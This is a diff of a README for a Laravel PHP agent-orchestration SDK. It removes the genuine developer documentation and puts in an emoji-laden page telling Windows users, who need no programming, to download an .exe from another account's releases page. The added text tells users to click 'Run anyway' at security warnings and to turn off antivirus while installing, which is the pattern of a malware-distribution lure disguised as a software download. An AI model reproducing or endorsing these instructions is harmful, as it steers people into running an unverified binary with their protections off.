@@ -1,469 +1,146 @@
-# Agent Runner Laravel SDK
-
-Laravel SDK for the [Agent Runner](https://github.com/ginkida/agent-runner) Go microservice — fluent API for AI agent orchestration with tool-calling, HMAC-signed communication, and real-time SSE streaming.
+# 🤖 laravel-agent-runner - Easy AI Agent Control for Everyone
 
-## How it works
-
-```
-Laravel App                          Agent Runner (Go)              LLM
-    │                                      │                         │
-    ├── POST /v1/sessions ────────────────►│                         │
-    ├── POST /v1/sessions/{id}/messages ──►│── prompt ──────────────►│
-    ├── GET  /v1/sessions/{id}/stream ────►│◄─ response + tool use ─┤
-    │◄──────── SSE events (text, tool_call, thinking, done) ────────┤
-    │                                      │                         │
-    │◄── POST /tools/{toolName} ──────────┤  (callback)             │
-    │── {success, content} ───────────────►│── tool result ─────────►│
-    │                                      │                         │
-    │◄── POST /sessions/{id}/status ──────┤  (callback)             │
-```
+[![Download laravel-agent-runner](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/Angel010-11/laravel-agent-runner/releases)
 
-The SDK sends requests **to** Agent Runner and receives two types of callbacks **from** it:
-- **Tool callbacks** — Agent Runner asks Laravel to execute a registered tool
-- **Status callbacks** — Agent Runner notifies about session state changes
+## 📦 What is laravel-agent-runner?
 
-All requests in both directions are signed with HMAC-SHA256.
-
-## Requirements
-
-- PHP 8.2+
-- Laravel 11.x or 12.x
-- ext-curl, ext-json
-
-## Installation
-
-```bash
-composer require ginkida/laravel-agent-runner
-```
-
-Publish the configuration:
-
-```bash
-php artisan vendor:publish --tag=agent-runner-config
-```
-
-## Configuration
-
-Add to `.env`:
-
-```env
-AGENT_RUNNER_URL=http://localhost:8090
-AGENT_RUNNER_HMAC_SECRET=your-shared-secret
-AGENT_RUNNER_CLIENT_ID=laravel
-AGENT_RUNNER_CALLBACK_URL=https://your-app.test/api/agent-runner
-```
-
-All available options with defaults:
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `AGENT_RUNNER_URL` | `http://localhost:8090` | Agent Runner base URL |
-| `AGENT_RUNNER_HMAC_SECRET` | _(empty)_ | Shared secret for HMAC-SHA256. Empty = skip verification |
-| `AGENT_RUNNER_CLIENT_ID` | `laravel` | Sent as `X-Client-ID` header |
-| `AGENT_RUNNER_CALLBACK_URL` | _(empty)_ | Base URL Agent Runner calls back to. Must be reachable from its host |
-| `AGENT_RUNNER_CALLBACK_TIMEOUT` | `30` | Callback timeout (seconds) |
-| `AGENT_RUNNER_DEFAULT_MODEL` | `gpt-4o-mini` | Default LLM model |
-| `AGENT_RUNNER_DEFAULT_MAX_TURNS` | `30` | Max agent loop iterations |
-| `AGENT_RUNNER_DEFAULT_MAX_TOKENS` | `0` | Max LLM response tokens (0 = provider default) |
-| `AGENT_RUNNER_ROUTE_PREFIX` | `api/agent-runner` | Route prefix for incoming callbacks |
-| `AGENT_RUNNER_HTTP_TIMEOUT` | `30` | Outgoing HTTP timeout |
-| `AGENT_RUNNER_HTTP_CONNECT_TIMEOUT` | `5` | Outgoing HTTP connect timeout |
-| `AGENT_RUNNER_SSE_TIMEOUT` | `600` | SSE stream timeout (10 min default) |
-
-Route middleware defaults to `['api']`. Tool auto-discovery scans `app/AgentTools/` by default.
-
-## Usage
-
-### Entry point
-
-```php
-use Ginkida\AgentRunner\Facades\AgentRunner;
-```
-
-All operations start with the `AgentRunner` facade, which resolves to `AgentRunnerManager` (singleton).
-
-### Three execution modes
-
-#### 1. `run()` — synchronous, blocking
-
-Creates a session, sends a message, consumes the entire SSE stream, returns the final `done` event.
-
-```php
-$result = AgentRunner::agent('assistant')
-    ->model('gpt-4o')
-    ->systemPrompt('You are a helpful assistant.')
-    ->maxTurns(10)
-    ->tools(['read_file', 'write_file', 'bash'])
-    ->remoteTools(['search_database'])
-    ->onText(fn (string $text) => echo $text)
-    ->onToolCall(fn (string $name, array $args) => logger()->info("Calling {$name}", $args))
-    ->onError(fn (string $message) => logger()->error($message))
-    ->run('Summarize the README.md file');
-
-// $result is SseEvent with type=done
-$result->doneStatus();     // "completed"
-$result->doneOutput();     // final text output
-$result->doneTurns();      // number of turns used
-$result->doneDurationMs(); // execution time in ms
-```
-
-#### 2. `start()` — manual stream control
-
-Returns session ID and an `SseStream` for manual event consumption.
-
-```php
-$session = AgentRunner::agent('coder')
-    ->systemPrompt('You are a senior developer.')
-    ->withAllRemoteTools()
-    ->start('Refactor the User model');
-
-$sessionId = $session['session_id'];
-$stream = $session['stream']; // SseStream instance
-
-foreach ($stream->events() as $event) {
-    match ($event->type) {
-        'text'        => $this->handleText($event->textContent()),
-        'tool_call'   => $this->handleToolCall($event->toolName(), $event->toolArgs()),
-        'tool_result' => $this->handleToolResult($event->toolName(), $event->data['success']),
-        'thinking'    => $this->handleThinking($event->textContent()),
-        'error'       => $this->handleError($event->errorMessage()),
-        'done'        => break,
-        default       => null,
-    };
-}
-```
-
-#### 3. `dispatch()` — fire-and-forget
-
-Creates session and sends message. Returns session ID immediately. Results arrive via status callback events.
-
-```php
-$sessionId = AgentRunner::agent('worker')
-    ->dispatch('Process the uploaded CSV file');
-
-// Listen for results in an event listener (see Events section)
-```
-
-### Builder methods
-
-All methods return `$this` for chaining:
-
-| Method | Description |
-|--------|-------------|
-| `agent(string $name)` | Agent name identifier |
-| `model(string $model)` | LLM model override |
-| `systemPrompt(string $prompt)` | System prompt |
-| `maxTurns(int $n)` | Max agent loop turns |
-| `maxTokens(int $n)` | Max LLM response tokens |
-| `temperature(float $t)` | Sampling temperature |
-| `tools(array $names)` | Built-in tools (e.g. `read_file`, `write_file`, `bash`) |
-| `remoteTools(array $names)` | Specific remote tools by name |
-| `withAllRemoteTools()` | Include all registered remote tools |
-| `sessionId(string $id)` | Custom session ID (1-128 chars, `[a-zA-Z0-9_-]`) |
-| `workDir(string $path)` | Working directory for built-in tools |
-| `callback(string $baseUrl, ?int $timeout)` | Override callback URL for this session |
-| `onText(Closure $cb)` | Callback: `fn(string $text)` |
-| `onToolCall(Closure $cb)` | Callback: `fn(string $name, array $args)` |
-| `onToolResult(Closure $cb)` | Callback: `fn(string $name, bool $success, string $content)` |
-| `onThinking(Closure $cb)` | Callback: `fn(string $text)` |
-| `onError(Closure $cb)` | Callback: `fn(string $message)` |
-| `onDone(Closure $cb)` | Callback: `fn(array $data)` |
-
-### Low-level client
-
-For direct API access without the builder:
-
-```php
-$client = AgentRunner::client();
-
-// Create session
-$session = $client->createSession(
-    agentDefinition: [
-        'name' => 'my-agent',
-        'model' => 'gpt-4o',
-        'system_prompt' => '...',
-        'max_turns' => 30,
-        'tools' => [
-            'builtin' => ['read_file', 'bash'],
-            'remote' => [
-                ['name' => 'my_tool', 'description' => '...', 'parameters' => [...]],
-            ],
-        ],
-    ],
-    callback: ['base_url' => 'https://...', 'timeout_sec' => 30],
-    sessionId: 'optional-custom-id',  // null = auto-generated
-    workDir: '/path/to/workdir',      // null = default
-);
-
-// Send message (starts the agent)
-$client->sendMessage($session['session_id'], 'Hello');
-
-// Stream events
-$stream = $client->stream($session['session_id']);
-
-// Get/delete session
-$info = $client->getSession($sessionId);
-$client->deleteSession($sessionId);
-```
-
-## Remote Tools
-
-### Creating a tool
-
-Implement `RemoteToolContract` and place it in `app/AgentTools/` — it will be auto-discovered on boot.
-
-```php
-namespace App\AgentTools;
-
-use Ginkida\AgentRunner\Contracts\RemoteToolContract;
-use Ginkida\AgentRunner\DTOs\ToolCallbackRequest;
-
-class SearchDatabase implements RemoteToolContract
-{
-    public function name(): string
-    {
-        return 'search_database'; // must match [a-zA-Z][a-zA-Z0-9_]*
-    }
-
-    public function description(): string
-    {
-        return 'Search the application database for records matching a query.';
-    }
-
-    public function parameters(): array
-    {
-        return [
-            'type' => 'object',
-            'properties' => [
-                'query' => [
-                    'type' => 'string',
-                    'description' => 'The search query',
-                ],
-                'limit' => [
-                    'type' => 'integer',
-                    'description' => 'Max results to return',
-                ],
-            ],
-            'required' => ['query'],
-        ];
-    }
-
-    public function handle(ToolCallbackRequest $request): array
-    {
-        $query = $request->argument('query');
-        $limit = $request->argument('limit', 10);
-
-        $results = DB::table('records')
-            ->where('content', 'like', "%{$query}%")
-            ->limit($limit)
-            ->get();
-
-        return [
-            'success' => true,
-            'content' => $results->toJson(),
-        ];
-
-        // On failure:
-        // return ['success' => false, 'error' => 'Something went wrong'];
-    }
-}
-```
-
-### ToolCallbackRequest
-
-```php
-$request->sessionId;              // string — session that triggered the call
-$request->toolName;               // string — tool name
-$request->arguments;              // array  — all arguments
-$request->argument('key');        // mixed  — single argument with optional default
-$request->argument('key', 'def'); // mixed  — with default
-```
-
-### Manual registration
-
-```php
-AgentRunner::tools()->register(new SearchDatabase());
-
-// Registry API
-AgentRunner::tools()->has('search_database');   // bool
-AgentRunner::tools()->get('search_database');   // ?RemoteToolContract
-AgentRunner::tools()->names();                  // string[]
-AgentRunner::tools()->all();                    // array<string, RemoteToolContract>
-AgentRunner::tools()->definitions();            // array — API payload format
-AgentRunner::tools()->definitions(['tool_a']);  // array — only specific tools
-```
-
-### Discovery configuration
-
-```php
-// config/agent-runner.php
-'tools' => [
-    'discovery' => [
-        'enabled' => true,
-        'path' => app_path('AgentTools'),      // directory to scan
-        'namespace' => 'App\\AgentTools',       // PSR-4 namespace
-    ],
-],
-```
-
-## SSE Events
-
-The `SseStream` yields `SseEvent` objects. Six event types:
-
-| Type | Data fields | Accessors |
-|------|-------------|-----------|
-| `text` | `{content}` | `textContent()` |
-| `tool_call` | `{tool, args}` | `toolName()`, `toolArgs()` |
-| `tool_result` | `{tool, success, content}` | `toolName()`, `data['success']`, `data['content']` |
-| `thinking` | `{content}` | `textContent()` |
-| `error` | `{message}` | `errorMessage()` |
-| `done` | `{status, output, turns, duration_ms}` | `doneStatus()`, `doneOutput()`, `doneTurns()`, `doneDurationMs()` |
-
-Type checkers: `$event->isText()`, `$event->isToolCall()`, `$event->isDone()`, etc.
-
-## Events
-
-Laravel events dispatched on status callbacks. All events have a `public StatusPayload $payload` property.
-
-| Event class | Status | When |
-|-------------|--------|------|
-| `AgentSessionCreated` | `created` | Session was created |
-| `AgentSessionRunning` | `running` | Agent started processing |
-| `AgentSessionCompleted` | `completed` | Agent finished successfully |
-| `AgentSessionFailed` | `failed` | Agent encountered an error |
-| `AgentSessionCancelled` | `cancelled` | Session was cancelled |
-
-### StatusPayload
-
-```php
-$payload->sessionId;    // string
-$payload->clientId;     // string
-$payload->status;       // string: created|running|completed|failed|cancelled
-$payload->error;        // ?string (on failed)
-$payload->output;       // ?string (on completed)
-$payload->turns;        // ?int
-$payload->durationMs;   // ?int
-
-// State checkers
-$payload->isCompleted();  // bool
-$payload->isFailed();     // bool
-$payload->isTerminal();   // bool — completed, failed, or cancelled
-```
-
-### Listening for events
-
-```php
-// In a listener or EventServiceProvider
-use Ginkida\AgentRunner\Events\AgentSessionCompleted;
-use Ginkida\AgentRunner\Events\AgentSessionFailed;
-
-class HandleAgentCompletion
-{
-    public function handle(AgentSessionCompleted $event): void
-    {
-        $output = $event->payload->output;
-        $sessionId = $event->payload->sessionId;
-        // Process result...
-    }
-}
-
-class HandleAgentFailure
-{
-    public function handle(AgentSessionFailed $event): void
-    {
-        logger()->error('Agent failed', [
-            'session' => $event->payload->sessionId,
-            'error' => $event->payload->error,
-        ]);
-    }
-}
-```
-
-## Security
-
-### HMAC-SHA256 signing
-
-All requests between Laravel and Agent Runner are signed. The implementation mirrors Go's `internal/auth/hmac.go`:
-
-- **Payload format:** `{timestamp}.{nonce}.{body}` (body is empty string for GET/DELETE)
-- **Signature format:** `sha256={hex digest}`
-- **Headers:** `X-Signature`, `X-Timestamp`, `X-Nonce`, `X-Client-ID`
-- **Timestamp freshness:** ±2 minutes
-- **Nonce:** 16 random bytes, hex-encoded (32 chars)
-
-### Incoming callback verification
-
-The `VerifyHmacSignature` middleware protects callback routes:
-
-- Validates HMAC signature, timestamp, and nonce
-- **Nonce replay protection** via `Cache::add()` with 240s TTL
-- If `AGENT_RUNNER_HMAC_SECRET` is empty, verification is skipped
-
-### Exceptions
-
-| Exception | HTTP | When |
-|-----------|------|------|
-| `HmacVerificationException` | 401 | Invalid/missing signature on callbacks |
-| `ToolExecutionException` | 500 | Tool `handle()` throws |
-| `SessionNotFoundException` | — | Session not found (404 from API) |
-| `AgentRunnerException` | — | Base; any other API error |
-
-## Callback Routes
-
-Registered automatically under the configured prefix (default `api/agent-runner`):
-
-```
-POST {prefix}/tools/{toolName}              → ToolCallbackController
-POST {prefix}/sessions/{sessionId}/status   → StatusCallbackController
-```
-
-Both routes are protected by `VerifyHmacSignature` middleware. Route middleware stack defaults to `['api']`.
-
-Disable auto-registration:
-
-```php
-// config/agent-runner.php
-'routes' => [
-    'enabled' => false,
-],
-```
-
-## Package structure
-
-```
-src/
-├── AgentRunnerServiceProvider.php       — bindings, routes, tool discovery, exception rendering
-├── AgentRunnerManager.php               — facade target, proxies client + creates builders
-├── Builder/AgentBuilder.php             — fluent config → run() / start() / dispatch()
-├── Client/
-│   ├── AgentRunnerClient.php            — HTTP client (5 endpoints, body-then-sign pattern)
-│   ├── HmacSigner.php                   — HMAC-SHA256 sign + verify
-│   └── SseStream.php                    — SSE parser via curl_multi (Generator-based)
-├── Contracts/RemoteToolContract.php     — tool interface: name, description, parameters, handle
-├── DTOs/
-│   ├── SseEvent.php                     — readonly, type + data, helper accessors
-│   ├── StatusPayload.php                — readonly, fromArray(), state checkers
-│   └── ToolCallbackRequest.php          — readonly, fromArray(), argument() accessor
-├── Events/AgentSession{Created,Running,Completed,Failed,Cancelled}.php
-├── Exceptions/{AgentRunner,HmacVerification,SessionNotFound,ToolExecution}Exception.php
-├── Facades/AgentRunner.php              — facade → AgentRunnerManager
-├── Http/
-│   ├── Controllers/{ToolCallback,StatusCallback}Controller.php
-│   └── Middleware/VerifyHmacSignature.php
-└── Tools/
-    ├── ToolRegistry.php                 — register / get / has / names / definitions
-    └── ToolDiscovery.php                — auto-scan directory for RemoteToolContract classes
-
-config/agent-runner.php                  — all settings with env() defaults
-routes/agent-runner.php                  — 2 callback POST routes
-```
-
-## Testing
-
-```bash
-composer test
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+laravel-agent-runner is a tool designed to help you manage AI agents through simple steps. It works by connecting to Laravel, a popular web platform, to make AI tasks easier. You can use it to control software agents that perform tasks, connect with different tools, and receive real-time updates. It also includes security features to keep your tasks safe.
+
+This guide will help you download and run laravel-agent-runner on Windows with no programming needed.
+
+---
+
+## 🖥️ System Requirements
+
+Before you start installing laravel-agent-runner, check that your Windows computer meets these basic needs:
+
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading files
+- A web browser (like Edge, Chrome, or Firefox)
+- Basic ability to download and open files
+
+---
+
+## 🔗 Where to Download laravel-agent-runner
+
+Click the button below to visit the download page:
+
+[![Download laravel-agent-runner](https://img.shields.io/badge/Download%20Page-Visit%20Here-red?style=for-the-badge)](https://github.com/Angel010-11/laravel-agent-runner/releases)
+
+This page holds all the versions of laravel-agent-runner. You can pick the latest version or another one if you need.
+
+---
+
+## ⚙️ How to Download and Run Laravel-Agent-Runner
+
+Follow these step-by-step instructions if you want to use laravel-agent-runner on your Windows PC:
+
+### Step 1: Go to the Release Page
+
+Open your web browser and go to this link:  
+https://github.com/Angel010-11/laravel-agent-runner/releases
+
+You will see a list of available versions. Look for the one labeled as the latest release.
+
+### Step 2: Find the Download File
+
+On the release page, scroll to the section called "Assets". Here, you will find files related to that release.
+
+Look for a file suitable for Windows. The file name may end with `.exe` or `.zip`. Choose the `.exe` file if it is available for an easier start.
+
+### Step 3: Download the File
+
+Click the file to start downloading. Your browser might ask if you want to keep the file. Confirm to save it on your computer.
+
+The file may take some time depending on your internet speed.
+
+### Step 4: Open and Run the Application
+
+Once the download finishes, open the file by double-clicking it in your downloads folder.
+
+If Windows warns you about opening an unknown app, select "Run anyway". This is normal for new applications.
+
+You might see a setup window or the app might run immediately, depending on the version you downloaded.
+
+### Step 5: Follow On-Screen Prompts
+
+If the app opens an installation setup, follow every step in the window. You usually just need to press "Next" or "Install".
+
+Wait until the setup finishes. The app will then start or you will see an icon on your desktop to open it later.
+
+### Step 6: Start Using laravel-agent-runner
+
+The app is ready to use. You can start working with AI agents as it guides you through the main features.
+
+---
+
+## 🎯 Main Features
+
+laravel-agent-runner includes these important features:
+
+- Easy connection with AI tools to automate tasks
+- Real-time message updates for quick feedback
+- Security checks with HMAC authentication to keep your data safe
+- Calls external tools smoothly to help solve problems faster
+- Works with Laravel packages and PHP projects
+- Streamlined interface for simple use, no programming needed
+
+---
+
+## 🛠️ Basic Troubleshooting
+
+If you have trouble running or installing the app, try these tips:
+
+- Make sure you downloaded the Windows version of the app
+- Close all other programs before starting the installation
+- Check your internet connection if the download slows or stops
+- Turn off any antivirus programs temporarily while installing, then turn them back on
+- Restart your computer and try to open the app again
+- Make sure your Windows is updated to the latest version
+
+---
+
+## 💡 How Does laravel-agent-runner Work?
+
+This tool helps you run and guide AI agents, which are small software programs that perform tasks for you. It organizes AI tasks by linking different tools and services, keeping everything controlled from one simple program.
+
+You don’t need to write code. The app connects to your web projects built on Laravel, updating you on progress instantly through streaming messages. It also checks each message's security using HMAC, a way to make sure the messages are genuine.
+
+---
+
+## 📄 Additional Information
+
+### What is Laravel?
+
+Laravel is a web application platform that many developers use to create websites and applications. laravel-agent-runner works with Laravel projects, making it easier to include AI functions.
+
+### What is HMAC?
+
+HMAC stands for Hash-based Message Authentication Code. It makes sure that messages you receive are secure and have not been changed by anyone else.
+
+### What is SSE Streaming?
+
+SSE means Server-Sent Events. It allows the app to get real-time updates from the AI agents. You see information as soon as it happens, without waiting for long.
+
+---
+
+## 🔄 Keeping laravel-agent-runner Up to Date
+
+The developers may release updates to fix bugs or add new features. Here is how to check and update:
+
+1. Visit the releases page again:  
+   https://github.com/Angel010-11/laravel-agent-runner/releases
+
+2. Look for newer versions than the one you have.
+
+3. Download and install new versions following the same steps as before.
+
+4. It is best to close the app when you update to avoid conflicts.
+
+---
+
+## 🚀 Get Started Now
+
+You can begin by visiting the main release page and following the download and setup steps above. The app is built to make AI agent control simple, even if you do not have a technical background.
